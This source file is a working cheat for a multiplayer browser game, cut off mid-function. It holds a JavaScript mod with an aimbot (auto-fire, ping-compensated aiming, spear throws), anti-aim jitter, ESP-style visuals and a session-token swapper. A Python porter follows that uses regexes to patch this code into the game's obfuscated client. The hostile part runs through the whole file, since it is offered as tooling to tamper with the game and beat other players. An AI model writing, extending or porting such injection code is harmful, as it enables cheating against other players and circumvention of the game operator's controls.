        if (MOD.autoFire && Aimbot.hasTarget() && Aimbot._spearStable !== false && Date.now() - (Aimbot._spearLastThrow || 0) > 830) {
            Aimbot._spearLastThrow = Date.now();
            Aimbot.send([4]);
            Aimbot.send([5]);
        }
    } else if (__gk(MOD.AimBotEnabled)) {
        if (MOD.jitterActive) {
            if (!Aimbot.refreshing) {
                if (!MOD.stopJittersOnStop || Aimbot.mouseDown) {
                    Aimbot.send([6, Jitter.getJitterAngle()]);
                }
            } else {
                Aimbot.send([6, Aimbot.resolve()]);
            }
        } else if (MOD.resolverType === "ping") {
            PingAim.tick++;
            if (PingAim.tick % Math.max(1, Math.round(PingAim.delay)) === 0) {
                var pAngle = __gk(Aimbot.resolve());
                var steps = Math.max(1, Math.round(PingAim.aimsteps));
                var from = PingAim.lastSent === -1 ? pAngle : PingAim.lastSent;
                var diff = ((pAngle - from) % 360 + 540) % 360 - 180;
                for (let st = 1; st <= steps; st++) {
                    let a = Math.round(((from + diff * st / steps) % 360 + 360) % 360);
                    if (st === 1) Aimbot.send([6, a]);
                    else setTimeout(function () { if (__gk(MOD.AimBotEnabled)) Aimbot.send([6, a]); }, PingAim.delaySend * (st - 1));
                }
                if (MOD.autoFire && Aimbot.hasTarget() && PingAim.shots < PingAim.ammo && (!MOD.pingTrigger || PingAim.confirmed(pAngle))) {
                    PingAim.shots++;
                    setTimeout(function () { Aimbot.send([4]); Aimbot.send([5]); }, PingAim.delaySend * (steps - 1));
                }
            }
        } else {
            var angle = __gk(Aimbot.resolve());
            Aimbot.send([6, angle]);
            if (MOD.hideAimbotAngle) {
                Aimbot.send([6, angle]);
                Aimbot.send([6, angle]);
            }
            if (MOD.autoFire && Aimbot.hasTarget()) {
                Aimbot.send([4]);
                Aimbot.send([5]);
            }
        }
    } else {
        GetAllTargets.lines[0].reset();
        GetAllTargets.lines[1].reset();
    }
    if (__gk(MOD.AntiAimbot)) {
        Aimbot.send([2, Jitter.strafe()]);
    }
}
(function aimbotLoop() {
    try {
        aimbotTick();
    } catch (e) {}
    setTimeout(aimbotLoop, MOD.AimBotEnabled || MOD.AntiAimbot || MOD.AimbotSpearEnabled ? 50 : 200);
})();
function __isMyAimbotPlayer(o, id) {
    var my = World.PLAYER[__TOK_MYID__];
    if (o === null || o === undefined || my === undefined || my === null)
        return false;
    if (id !== undefined && id !== null)
        return id === my;
    var key = __isMyAimbotPlayer.key;
    if (key !== undefined && o[key] !== undefined)
        return o[key] === my;
    for (var k in o) {
        if (typeof o[k] === "number" && o[k] === my) {
            __isMyAimbotPlayer.key = k;
            return true;
        }
    }
    return false;
}
__TOK_WINDOW__.__isMyAimbotPlayer = __isMyAimbotPlayer;
globalThis.__isMyAimbotPlayer = __isMyAimbotPlayer;
__TOK_WINDOW__.MOD = MOD;
__TOK_WINDOW__.PingAim = PingAim;
__TOK_WINDOW__.Aimbot = Aimbot;
__TOK_WINDOW__.GetAllTargets = GetAllTargets;
__TOK_WINDOW__.addEventListener("mousemove", function(event) {
    GetAllTargets.mousePosition.x = event.clientX;
    GetAllTargets.mousePosition.y = event.clientY;
});
var __oTouchAim = function(event) {
    // changedTouches[0] = the finger that just moved/landed — the aim intent,
    // not a finger already parked on the joystick
    var t = event.changedTouches && event.changedTouches.length ? event.changedTouches[0]
        : (event.touches && event.touches.length ? event.touches[0] : null);
    if (t) {
        GetAllTargets.mousePosition.x = t.clientX;
        GetAllTargets.mousePosition.y = t.clientY;
    }
};
__TOK_WINDOW__.addEventListener("touchstart", __oTouchAim, { passive: true });
__TOK_WINDOW__.addEventListener("touchmove", __oTouchAim, { passive: true });
document.addEventListener("mousedown", function(event) {
    if (event.button === 0)
        Aimbot.mouseDown = true;
});
document.addEventListener("mouseup", function(event) {
    if (event.button === 0)
        Aimbot.mouseDown = false;
});
__TOK_WINDOW__.addEventListener("blur", function() {
    Aimbot.mouseDown = false;
});
__TOK_WINDOW__.addEventListener("keydown", function(event) {
    var el = document.activeElement;
    if (el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA" || el.isContentEditable))
        return;
    if (event.code === MOD.AimbotKey) {
        MOD.AimBotEnabled = !MOD.AimBotEnabled;
        if (!MOD.AimBotEnabled)
            GetAllTargets.resetLines();
    } else if (event.code === MOD.JitterKey) {
        MOD.jitterActive = !MOD.jitterActive;
    } else if (event.code === MOD.HideAngleKey) {
        MOD.hideAimbotAngle = !MOD.hideAimbotAngle;
    } else if (event.code === MOD.AntiAimbotKey) {
        MOD.AntiAimbot = !MOD.AntiAimbot;
    } else {
        return;
    }
    if (__TOK_WINDOW__.AimbotMenu)
        __TOK_WINDOW__.AimbotMenu.updateDisplay();
    AimbotSaveConfig();
});
function AimbotSaveConfig() {
    try {
        localStorage.setItem("BestModMenuConfig", JSON.stringify(MOD));
    } catch (e) {}
}
function AimbotLoadConfig() {
    try {
        var saved = JSON.parse(localStorage.getItem("BestModMenuConfig"));
        if (saved && typeof saved === "object") {
            for (var field in MOD) {
                if (field in saved && typeof saved[field] === typeof MOD[field]) {
                    MOD[field] = saved[field];
                }
            }
        }
        MOD.mouseFovEnable = true;
        if (!saved || saved.pingAimV !== 1) {
            MOD.resolverType = "ping";
            MOD.pingAimV = 1;
        }
    } catch (e) {}
}
function AimbotMenuSetupKey(folder, keyName, displayName) {
    const input = folder.add(MOD, keyName).name(displayName);
    const element = input.domElement.querySelector("input");
    element.readOnly = true;
    element.style.textAlign = "center";
    element.style.cursor = "pointer";
    element.addEventListener("click", () => {
        element.blur();
        MOD[keyName] = "...";
        input.updateDisplay();
        function KeyHandler(event) {
            MOD[keyName] = event.code;
            if (keyName === "ModMenuKey") {
                MOD.ModMenuKeyCode = event.keyCode;
            }
            input.updateDisplay();
            AimbotSaveConfig();
            document.removeEventListener("keydown", KeyHandler);
        }
        document.addEventListener("keydown", KeyHandler);
    }
    );
}
function AimbotHookSave(gui) {
    gui.__controllers.forEach(function(controller) {
        var previous = controller.__onFinishChange;
        controller.onFinishChange(function(value) {
            if (previous)
                previous.call(controller, value);
            AimbotSaveConfig();
        });
    });
    for (var name in gui.__folders) {
        AimbotHookSave(gui.__folders[name]);
    }
}
var TokenChanger = {
    genToken: function() {
        var token = "";
        for (var i = 0; i < 20; i++) {
            token += String.fromCharCode(48 + Math.floor(Math.random() * 74));
        }
        return token;
    },
    extract: function(text) {
        var values = String(text || "").match(/"([^"]*)"/g);
        if (values && values.length === 3) {
            return {
                token: values[0].slice(1, -1),
                tokenId: values[1].slice(1, -1),
                userId: values[2].slice(1, -1)
            };
        }
        return null;
    },
    relog: function() {
        try {
            if (typeof __TOK_WINDOW__.ClientCloseSocket === "function") {
                __TOK_WINDOW__.ClientCloseSocket();
            }
        } catch (e) {}
        location.reload();
    },
    copy: function() {
        var token = localStorage.getItem("token");
        var tokenId = localStorage.getItem("tokenId");
        var userId = localStorage.getItem("userId");
        var message = '"' + token + '" "' + tokenId + '" "' + userId + '"';
        try {
            navigator.clipboard.writeText(message);
        } catch (e) {}
        console.log(message);
    },
    change: function(input) {
        var values = TokenChanger.extract(MOD.Token);
        if (!values) {
            alert("Failed to read token");
            return;
        }
        localStorage.setItem("token", values.token);
        localStorage.setItem("tokenId", values.tokenId);
        localStorage.setItem("userId", values.userId);
        MOD.Token = "";
        if (input)
            input.updateDisplay();
        AimbotSaveConfig();
        TokenChanger.relog();
    },
    reset: function() {
        if (!window.confirm("Are you sure want to reset your token?"))
            return;
        localStorage.setItem("token", TokenChanger.genToken());
        TokenChanger.relog();
    }
};
__TOK_WINDOW__.TokenChanger = TokenChanger;
function AimbotMenuInit() {
    if (__TOK_WINDOW__.AimbotMenu || !__TOK_WINDOW__.dat || !__TOK_WINDOW__.dat.GUI)
        return;
    AimbotLoadConfig();
    const menu = new __TOK_WINDOW__.dat.GUI();
    __TOK_WINDOW__.AimbotMenu = menu;
    const aimFolder = menu.addFolder("👑 Aim Bot 👑");
    aimFolder.add(MOD, "AimBotEnabled").name("AimBotEnabled");
    aimFolder.add(MOD, "target", ["players", "ghouls", "all"]).name("Target");
    aimFolder.add(MOD, "resolverType", ["ping", "linear", "1"]).name("ResolverType");
    aimFolder.add(MOD, "TargetTeammate").name("TargetTeammate");
    aimFolder.add(MOD, "hideAimbotAngle").name("HideAimbotAngle");
    aimFolder.add(MOD, "hidePlayerAngle").name("HidePlayerAngle");
    aimFolder.add(MOD, "ShowRealAngles", ["never", "always", "withAim"]).name("ShowRealAngles");
    aimFolder.add(MOD, "mouseFovEnable").name("MouseFovEnable");
    aimFolder.add(MOD, "mouseFov", 0, 12345, 100).name("MouseFov");
    aimFolder.add(MOD, "distanceCoefficient", 10, 1000, 10).name("DistanceCoefficient");
    aimFolder.add(MOD, "bulletSpeedCoefficient", 1, 20, 0.5).name("BulletSpeedCoeff");
    aimFolder.add(MOD, "offsetCoefficient", 0, 3, 0.1).name("OffsetCoefficient");
    aimFolder.add(MOD, "autoFire").name("AutoFire");
    aimFolder.add(MOD, "lockId", -1, 120, 1).name("LockId");
    const pingFolder = menu.addFolder("\ud83d\udce1 Ping Aim \ud83d\udce1");
    pingFolder.add(PingAim, "currentPing").name("CurrentPing").listen();
    pingFolder.add(PingAim, "avgPing").name("AvgPing").listen();
    pingFolder.add(MOD, "pingHud").name("ShowPingHud");
    pingFolder.add(MOD, "pingTrigger").name("PingTrigger");
    pingFolder.add(PingAim, "triggerTol", 1, 30, 1).name("TriggerTolerance");
    pingFolder.add(PingAim, "ping", 0, 500, 1).name("Ping (fallback)");
    pingFolder.add(PingAim, "startfrom", 0, 3, 0.05).name("StartFrom");
    pingFolder.add(PingAim, "pingSteps", 1, 500, 1).name("PingSteps");
    pingFolder.add(PingAim, "aimsteps", 1, 5, 1).name("AimSteps");
    pingFolder.add(PingAim, "delaySend", 0, 100, 1).name("DelaySend");
    pingFolder.add(PingAim, "delay", 1, 10, 1).name("Delay");
    pingFolder.add(PingAim, "ammo", 1, 100, 1).name("Ammo");
    const spearFolder = menu.addFolder("\ud83d\udde1 Aimbot Spear \ud83d\udde1");
    spearFolder.add(MOD, "AimbotSpearEnabled").name("AimbotSpearEnabled");
    spearFolder.add(MOD, "spearSpeed", 20, 60, 0.5).name("SpearSpeed");
    spearFolder.add(MOD, "spearMaxRange", 200, 600, 10).name("MaxRange");
    spearFolder.add(MOD, "spearHandFwd", -60, 60, 1).name("HandFwd");
    spearFolder.add(MOD, "spearHandSide", -60, 60, 1).name("HandSide");
    spearFolder.add(MOD, "spearStabDeg", 0.5, 10, 0.5).name("Stability");
    spearFolder.add(MOD, "autoFire").name("AutoThrow");
    const antiFolder = menu.addFolder("Anti-Aim / Strafe");
    antiFolder.add(MOD, "AntiAimbot").name("StrafeEnable");
    antiFolder.add(MOD, "antiAimMode", ["At target", "Round", "Round2"]).name("AntiAimMode");
    antiFolder.add(MOD, "antiAimCoefficient", 10, 500, 10).name("AntiAimCoefficient");
    antiFolder.add(MOD, "jitterActive").name("JitterActive");
    antiFolder.add(MOD, "jitterOffset", 0, 360, 1).name("JitterOffset");
    antiFolder.add(MOD, "stopJittersOnStop").name("StopJittersOnStop");
    const lineFolder = menu.addFolder("Aim Line");
    lineFolder.add(MOD, "visualizeResolving").name("ShowAimLine");
    lineFolder.addColor(MOD, "visualizeResolvingColor").name("AimLineColor");
    const dynFolder = menu.addFolder("🧪 Dynamic Aim (Test)");
    dynFolder.add(MOD, "dynamicAimEnabled").name("Enabled (OFF by default)");
    dynFolder.add(MOD, "closeRange", 50, 1000, 10).name("Close MaxDist");
    dynFolder.add(MOD, "closeDistCoeff", 10, 2000, 10).name("Close DistCoeff");
    dynFolder.add(MOD, "closeOffsetCoeff", 0, 3, 0.1).name("Close Offset");
    dynFolder.add(MOD, "midRange", 100, 2000, 10).name("Mid MaxDist");
    dynFolder.add(MOD, "midDistCoeff", 10, 2000, 10).name("Mid DistCoeff");
    dynFolder.add(MOD, "midOffsetCoeff", 0, 3, 0.1).name("Mid Offset");
    dynFolder.add(MOD, "farDistCoeff", 10, 2000, 10).name("Far DistCoeff");
    dynFolder.add(MOD, "farOffsetCoeff", 0, 3, 0.1).name("Far Offset");
    const keyFolder = menu.addFolder("Keyboard");
    AimbotMenuSetupKey(keyFolder, "AimbotKey", "AimbotKey");
    AimbotMenuSetupKey(keyFolder, "AntiAimbotKey", "AntiAimbotKey");
    AimbotMenuSetupKey(keyFolder, "JitterKey", "JitterKey");
    AimbotMenuSetupKey(keyFolder, "HideAngleKey", "HideAngleKey");
    AimbotMenuSetupKey(keyFolder, "ModMenuKey", "ModMenuKey");
    const visualFolder = menu.addFolder("👁 Visuals");
    visualFolder.add(MOD, "ShowPosition").name("ShowPosition");
    visualFolder.add(MOD, "ShowGauges").name("ShowGauges");
    visualFolder.add(MOD, "ShowMines").name("ShowMines");
    visualFolder.add(MOD, "ShowSpikes").name("ShowSpikes");
    visualFolder.add(MOD, "ShowWires").name("ShowWires");
    visualFolder.add(MOD, "ShowNamesOnMap").name("ShowNamesOnMap");
    visualFolder.add(MOD, "ShowHousesNamesOnMap").name("ShowHousesNamesOnMap");
    visualFolder.add(MOD, "ShowKarmaOnPlayers").name("ShowKarmaOnPlayers");
    visualFolder.add(MOD, "ShowBuildingOwner").name("ShowBuildingOwner");
    visualFolder.add(MOD, "AutoOpenSlotsInv").name("AutoOpenSlotsInv");
    visualFolder.addColor(MOD, "EnemyClanColor").name("Clan Color");
    visualFolder.addColor(MOD, "TeamClanColor").name("Enemy");
    const tokenFolder = menu.addFolder("🔑 Token Changer");
    tokenFolder.add({
        clickMe: function() {
            TokenChanger.copy();
        }
    }, "clickMe").name("Copy");
    const tokenInput = tokenFolder.add(MOD, "Token").name("Token");
    tokenFolder.add({
        clickMe: function() {
            TokenChanger.change(tokenInput);
        }
    }, "clickMe").name("Change");
    tokenFolder.add({
        clickMe: function() {
            TokenChanger.reset();
        }
    }, "clickMe").name("ResetToken");
    const configFolder = menu.addFolder("Config");
    configFolder.add({
        clickMe: function() {
            AimbotSaveConfig();
        }
    }, "clickMe").name("Save Config");
    configFolder.add({
        clickMe: function() {
            try {
                localStorage.removeItem("BestModMenuConfig");
            } catch (e) {}
            location.reload();
        }
    }, "clickMe").name("Reset Config");
    aimFolder.open();
    AimbotHookSave(menu);
}
__TOK_WINDOW__.AimbotMenuInit = AimbotMenuInit;
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", AimbotMenuInit);
} else {
    AimbotMenuInit();
}"""


class AimbotPortError(RuntimeError):
    """Raised when an aimbot anchor cannot be located in the target client."""


def port_aimbot(src: str, ent: str | None = None) -> str:
    """Detect aimbot-related vars in the target client and inject aimbot,
    dat.GUI aim folders and the Token Changer.

    Everything is located structurally (patterns / relative anchors); no
    hard-coded line ranges and no hard-coded entity object name.
    """
    import re
    spear = find_spear(src)
    SPEAR_IDX = spear.get("spear_idx", -1)
    if "Aimbot.onDeath" in src and "GetAllTargets" in src:
        # already ported: swap only the stale mod tail — the client-code
        # grafts are already in place and can't be re-anchored.
        i_stale = src.find('/* ===================== MOD BLOCK (ported)')
        if i_stale >= 0:
            W2 = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'
            nfx = find_net(src)
            tw_m = re.search(r'const (%s) = window;' % W2, src)
            ids = Counter(re.findall(r'World\.PLAYER\[(%s)\]' % W2, src))
            ids = Counter({k: v for k, v in ids.items()
                           if not k[0].isdigit() and not k.startswith(('"', "'"))})
            blk = AIMBOT_BLOCK
            for a, b in {
                '__TOK_WINDOW__': tw_m.group(1) if tw_m else 'window',
                '__TOK_MYID__': max(ids, key=ids.get) if ids else 'id',
                '__TOK_CLAN__': find_team_field(src) or 'clan',
                '__TOK_NET__': nfx.get('net_obj') or 'NET',
                '__TOK_SEND__': nfx.get('send_method') or 'send',
            }.items():
                blk = blk.replace(a, b)
            blk = blk.replace('__SPEAR_IDX__', str(SPEAR_IDX))
            src = src[:i_stale].rstrip('\n') + '\n' \
                + '/* ===================== MOD BLOCK (ported) ===================== */\n' \
                + blk + '\n/* =================== MOD BLOCK end =================== */\n' \
                + '  WaitANDrunHTML();\n'
            return src
    block = AIMBOT_BLOCK
    L = src.split('\n')
    W = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'   # obfuscated identifier

    ENT = ent or detect_entity_obj(src)
    ENT_RX = re.escape(ENT)

    def fail(what: str, hint: str = "") -> None:
        msg = "anchor not found: %s" % what
        if hint:
            msg += " (%s)" % hint
        raise AimbotPortError(msg)

    def rx1(pat, text=src, g=1, what=None):
        m = re.search(pat, text)
        if not m:
            fail(what or "pattern", pat)
        return m.group(g)

    def scan(pred, lo=0, hi=None, what="line"):
        """First line index in [lo, hi) satisfying pred."""
        hi = len(L) if hi is None else min(hi, len(L))
        for i in range(max(lo, 0), hi):
            if pred(L[i]):
                return i
        fail(what, "searched lines %d..%d" % (lo, hi))

    def scan_all(pred):
        return [i for i, s in enumerate(L) if pred(s)]

    # ---------- target tokens (extracted, never typed) ----------
    T_window = rx1(r'const (%s) = window;' % W, what="`const X = window;`")

    # clan field: an identifier that is reset to -1 on a player object.
    # Tried structurally, from the most specific form to the most generic.
    def detect_clan() -> str:
        # the clan id is the field indexed into the clan table:
        # `World.<tbl>[PLAYER.<f>]` / `World.<tbl>[World.PLAYER.<f>]`
        lookup = Counter(f for _, f in re.findall(
            r'World\.(%s)\[(?:World\.)?PLAYER\.(%s)\]' % (W, W), src)
            if f and not f[0].isdigit())
        if lookup:
            return lookup.most_common(1)[0][0]
        pats = (
            r'World\.players\[[^\]]+\]\.(%s)\s*=\s*-1' % W,
            r'World\.PLAYER\.(%s)\s*=\s*-1' % W,
            r'\.players\[[^\]]+\]\.(%s)\s*=\s*-1' % W,
        )
        for pat in pats:
            hits = Counter(re.findall(pat, src))
            hits = Counter({k: v for k, v in hits.items() if not k[0].isdigit()})
            if hits:
                return hits.most_common(1)[0][0]
        # last resort: a field set to -1 on the same object that also carries
        # the player id field, e.g. `x.clan = -1` inside the player constructor
        hits = Counter(re.findall(r'this\.(%s)\s*=\s*-1' % W, src))
        if hits:
            return hits.most_common(1)[0][0]
        fail("clan field (an identifier assigned -1 on a player object, "
             "e.g. `World.players[p].clan = -1;`)",
             "checked World.players[...] / World.PLAYER / this.X = -1")

    T_clan = detect_clan()
    # my-player id field: most frequent identifier used as World.PLAYER[<name>]
    ids = Counter(re.findall(r'World\.PLAYER\[(%s)\]' % W, src))
    ids = Counter({k: v for k, v in ids.items() if not k[0].isdigit() and not k.startswith(('"', "'"))})
    if not ids:
        fail("player id key (`World.PLAYER[<id>]`)")
    MYID = ids.most_common(1)[0][0]

    # ---------- port donor mod block ----------
    nfx = find_net(src)
    DON = {
        '__TOK_WINDOW__': T_window,
        '__TOK_MYID__': MYID,
        '__TOK_CLAN__': T_clan,
        '__TOK_NET__': nfx.get('net_obj') or fail('net object'),
        '__TOK_SEND__': nfx.get('send_method') or fail('send method'),
    }
    for a, b in DON.items():
        if a not in block:
            raise AimbotPortError("donor placeholder missing in AIMBOT_BLOCK: %s" % a)
        block = block.replace(a, b)
    WFIELD = spear.get("weapon_field")
    if SPEAR_IDX < 0 or not WFIELD:
        print("  WARNING spear detection incomplete (idx=%s field=%s) — spear aimbot disabled" % (SPEAR_IDX, WFIELD))
        SPEAR_IDX = -1
    block = block.replace('__SPEAR_IDX__', str(SPEAR_IDX))

    patches = []  # (start, end, newlines)

    # ---- 0) clan tag colors: make the native clan text cache depend on MOD colors ----
    for i, s in enumerate(L):
        m_clan_obj = re.search(r'var\s+(?P<cv>%s)\s*=\s*World\.(?P<table>%s)\s*\[\s*PLAYER\.%s\s*\]\s*;' % (W, W, re.escape(T_clan)), s)
        if not m_clan_obj:
            continue
        cv = m_clan_obj.group('cv')
        table = m_clan_obj.group('table')
        win_hi = min(len(L), i + 28)
        if any('_grokClanColor' in L[j] for j in range(i, win_hi)):
            break
        gate_i = cache_i = render_i = None
        member_player = member_clan = cache_prop = None
        for j in range(i + 1, win_hi):
            if gate_i is None:
                m_gate = re.search(r'if\s*\(\s*PLAYER\.(?P<mp>%s)\s*===\s*%s\.(?P<mc>%s)\s*\)\s*\{' % (W, re.escape(cv), W), L[j])
                if not m_gate:
                    # new clients flip the operands: `if (cv.<mc> === PLAYER.<mp>) {`
                    m_gate = re.search(r'if\s*\(\s*%s\.(?P<mc>%s)\s*===\s*PLAYER\.(?P<mp>%s)\s*\)\s*\{' % (re.escape(cv), W, W), L[j])
                if m_gate:
                    gate_i = j
                    member_player = m_gate.group('mp')
                    member_clan = m_gate.group('mc')
            if cache_i is None:
                m_cache = re.search(r'if\s*\(\s*%s\.(?P<cache>%s)\s*===\s*null\s*\)\s*\{' % (re.escape(cv), W), L[j])
                if m_cache:
                    cache_i = j
                    cache_prop = m_cache.group('cache')
            if cache_prop and render_i is None and (cv + '.' + cache_prop) in L[j] and re.search(r'"#[0-9A-Fa-f]{6}"', L[j]):
                render_i = j
        if gate_i is None or cache_i is None or render_i is None or not member_player or not member_clan or not cache_prop:
            continue
        indent = re.match(r'\s*', L[cache_i]).group(0)
        # donor self-check: `<entity>.<ownerField> === World.PLAYER[<MYID>]` where the
        # entity is the enclosing draw function's param and ownerField is the prop used
        # as `World.players[<param>.<field>]` at the top of that function.
        ent_var = ent_owner = None
        for k in range(i, max(0, i - 60), -1):
            m_fn = re.search(r'function\s+%s\s*\(\s*(?P<p>%s)' % (W, W), L[k])
            if m_fn:
                ent_var = m_fn.group('p')
                m_own = re.search(r'World\.players\s*\[\s*%s\.(?P<f>%s)\s*\]' % (re.escape(ent_var), W),
                                  '\n'.join(L[k:i + 1]))
                if m_own:
                    ent_owner = m_own.group('f')
                break
        self_check = (indent + '  if (%s.%s === World.PLAYER[%s]) _grokSameClan = true;'
                      % (ent_var, ent_owner, MYID)) if ent_var and ent_owner else \
                     (indent + '  if (%s[%s] === World.PLAYER[%s]) _grokSameClan = true;' % (cv, MYID, MYID))
        color_lines = [
            indent + 'var _grokClanColor = "#FF0000";',
            indent + 'try {',
            indent + '  var _grokSameClan = false;',
            indent + '  if (PLAYER && World.PLAYER && World.PLAYER.%s !== -1) {' % T_clan,
            indent + '    _grokSameClan = PLAYER.%s === World.PLAYER.%s;' % (T_clan, T_clan),
            indent + '  }',
            self_check,
            indent + '  _grokClanColor = _grokSameClan ? MOD.EnemyClanColor : MOD.TeamClanColor;',
            indent + '} catch (e) {}',
            indent + 'if (%s.%s === null || %s._grokClanColor !== _grokClanColor) {' % (cv, cache_prop, cv),
        ]
        # donor keeps the "#FFFFFF" fill arg and recolors the LAST hex literal in the
        # builder call (the tag's stroke color) — not the first.
        hexes = list(re.finditer(r'"#[0-9A-Fa-f]{6}"', L[render_i]))
        new_render = L[render_i]
        if hexes:
            h = hexes[-1]
            new_render = L[render_i][:h.start()] + '_grokClanColor' + L[render_i][h.end():]
        patches.append((cache_i, cache_i + 1, color_lines))
        patches.append((render_i, render_i + 1, [new_render, indent + '  %s._grokClanColor = _grokClanColor;' % cv]))
        break

    # ---- 1) entity loop: setInactive on remove ----
    rm_rx = re.compile(r'%s\[%s\]\((%s), (%s), (%s), (%s), (%s)\);' % (ENT_RX, W, W, W, W, W, W))
    i_rm = None
    for i, s in enumerate(L):
        if ENT + '[' not in s:
            continue
        if not rm_rx.search(s):
            continue
        # the removal branch is followed by a `continue;` a few lines below
        if any(L[j].strip() == 'continue;' for j in range(i, min(i + 6, len(L)))):
            i_rm = i
            break
    if i_rm is None:
        fail("entity remove call `%s[..](a, b, c, d, e);` followed by `continue;`" % ENT,
             "entity object detected as '%s'" % ENT)
    args = rm_rx.search(L[i_rm])
    E_owner, E_aux, E_unit, E_type = args.group(1), args.group(2), args.group(3), args.group(4)
    i_cont = scan(lambda s: s.strip() == 'continue;', i_rm, i_rm + 6, "`continue;` after entity remove")
    patches.append((i_cont, i_cont, [
        "        if (%s !== 0 && %s === 0) {" % (E_owner, E_type),
        "          GetAllTargets.getPlayerById(%s).setInactive();" % E_owner,
        "          if (World.PLAYER[%s] !== undefined) Aimbot.selfId = World.PLAYER[%s];" % (MYID, MYID),
        "          if (%s === Aimbot.myId()) {" % E_owner,
        "            Aimbot.onDeath();",
        "          }",
        "        }",
        "        if (%s !== 0 && %s === 13) {" % (E_unit, E_type),
        "          GetAllTargets.getGhoulByUid(%s).setInactive();" % E_unit,
        "        }",
    ]))

    # ---- 2) entity loop: update ----
    # New clients hide `get` behind bracket notation. Match the assignment by
    # its four decoded arguments, then take coordinates from the helper call.
    acquire_rx = re.compile(
        r'(?P<entity>%s)\s*=\s*%s(?:\.%s|\[%s\])\(\s*%s\s*,\s*%s\s*,\s*%s\s*,\s*%s\s*\)\s*;'
        % (W, ENT_RX, W, W, re.escape(E_owner), re.escape(E_aux),
           re.escape(E_unit), re.escape(E_type)))
    mget = None
    i_get = None
    for j in range(i_cont + 1, min(i_cont + 16, len(L))):
        mget = acquire_rx.search(L[j])
        if mget:
            i_get = j
            break
    if not mget or i_get is None:
        fail("entity acquire call after the remove branch",
             "expected `%s[method](owner, aux, unit, type)`" % ENT)

    entity_var = mget.group('entity')
    helper_rx = re.compile(r'%s\(\s*%s\s*,\s*(?P<rest>[^;]+)\)\s*;'
                           % (W, re.escape(entity_var)))
    helper = None
    i_helper = None
    for j in range(i_get + 1, min(i_get + 5, len(L))):
        candidate = helper_rx.search(L[j])
        if candidate:
            fields = [part.strip() for part in candidate.group('rest').split(',')]
            if len(fields) >= 6 and fields[:4] == [E_owner, E_unit, E_aux, E_type]:
                helper, i_helper = candidate, j
                break
    if not helper or i_helper is None:
        fail("entity update helper after acquire call")
    fields = [part.strip() for part in helper.group('rest').split(',')]
    POS_X, POS_Y = fields[4], fields[5]
    POS_W = fields[6] if len(fields) > 6 else "0"
    POS_A = "undefined"
    helper_name = helper.group(0).split('(')[0].strip()
    mdef = re.search(r'function\s+%s\s*\(([^)]*)\)' % re.escape(helper_name), src)
    if mdef:
        params = [x.strip() for x in mdef.group(1).split(',')]
        body = src[mdef.end():mdef.end() + 1500]
        mang = re.search(
            r'((?:%s\s*\*\s*)*%s)\s*\*\s*Math(?:\[[^\]]+\]|\.PI)\s*/\s*(?:\d+|%s)'
            % (W, W, W), body)
        if mang:
            for cand in re.findall(W, mang.group(1)):
                if cand in params:
                    k = params.index(cand) - 1
                    if 0 <= k < len(fields):
                        POS_A = fields[k]
                    break
    if POS_A == "undefined":
        print("  WARNING ping aim: angle field not found, ping fallback only")

    # Insert directly after the helper: coordinates are already decoded here.
    update_lines = [
        "      if (%s !== 0 && %s === 0) {" % (E_owner, E_type),
        "        GetAllTargets.getPlayerById(%s).update(%s, %s, %s);" % (E_owner, POS_X, POS_Y, POS_W),
        "        try { GetAllTargets.getPlayerById(%s).weaponIdx = (%s.%s >> 8) & 255; if (%s === Aimbot.myId()) GetAllTargets.selfWeapon = (%s.%s >> 8) & 255; } catch (e) {}" % (E_owner, entity_var, WFIELD or 'x', E_owner, entity_var, WFIELD or 'x'),
        "        if (World.PLAYER[%s] !== undefined) Aimbot.selfId = World.PLAYER[%s];" % (MYID, MYID),
        "        if (%s === Aimbot.myId()) {" % E_owner,
        "          GetAllTargets.selfPosition = { x: %s, y: %s };" % (POS_X, POS_Y),
        "          GetAllTargets.selfFromPacket = Date.now();",
        "          try { PingAim.onSelf(%s); } catch (e) {}" % POS_A,
        "        }",
        "        if (Aimbot.dead && %s === Aimbot.myId()) {" % E_owner,
        "          Aimbot.dead = false;",
        "        }",
        "      }",
        "      if (%s !== 0 && %s === 13) {" % (E_unit, E_type),
        "        GetAllTargets.getGhoulByUid(%s).update(%s, %s, %s);" % (E_unit, POS_X, POS_Y, POS_W),
        "      }",
    ]
    patches.append((i_helper + 1, i_helper + 1, update_lines))

    # ---- 3) death ----
    # No packet-decoding formula is stable across client versions.  Death is
    # detected above in the structurally identified entity-removal branch:
    # removing a type-0 entity whose owner is the local player means death.

    # ---- 4/5) mouse down / up packets ----
    # The classic shape is `sendPacket(x.y([4]));` / `sendPacket(x.y([5]));`,
    # but newer builds store the opcodes in constants and rename the wrapper.
    # So: find every call that gets a single-element array literal, resolve the
    # element through numeric constants when it is an identifier, and pick the
    # 4/5 pair (falling back to the two nearest such calls).
    ID = r'[A-Za-z_$][A-Za-z0-9_$]*'   # strict identifier: keeps these scans linear
    const_vals = {}
    const_aliases = {}
    for name, val in re.findall(r'\bconst\s+(%s)\s*=\s*(%s|\d{1,3})\s*;' % (W, W), src):
        if val.isdigit():
            const_vals[name] = int(val)
        else:
            const_aliases[name] = val

    def resolve_const(name):
        seen = set()
        while name not in seen:
            seen.add(name)
            if name in const_vals:
                return const_vals[name]
            name = const_aliases.get(name)
            if name is None:
                return None
        return None

    # --- helpers: never inject in the middle of a statement or an array ---
    def _array_depth_per_line(lines):
        """Array-literal nesting depth at the start of every line."""
        depths, depth, in_str, in_blk = [], 0, None, False
        for line in lines:
            depths.append(depth)
            k = 0
            while k < len(line):
                ch = line[k]
                if in_blk:
                    if ch == '*' and line[k + 1:k + 2] == '/':
                        in_blk = False
                        k += 1
                elif in_str:
                    if ch == '\\':
                        k += 1
                    elif ch == in_str:
                        in_str = None
                elif ch in '"\'`':
                    in_str = ch
                elif ch == '/' and line[k + 1:k + 2] == '*':
                    in_blk = True
                    k += 1
                elif ch == '/' and line[k + 1:k + 2] == '/':
                    break
                elif ch == '[':
                    depth += 1
                elif ch == ']':
                    depth = max(0, depth - 1)
                k += 1
            if in_str in ('"', "'"):
                in_str = None
        return depths

    LINE_ARRAY_DEPTH = _array_depth_per_line(L)

    # Depth at every column of a line, computed once per line.  Minified
    # clients keep everything on a few very long lines, so rescanning the
    # prefix for every regex match made this step quadratic (the hang).
    _PREFIX_DEPTH_CACHE: dict[int, tuple] = {}

    def _prefix_depths(line):
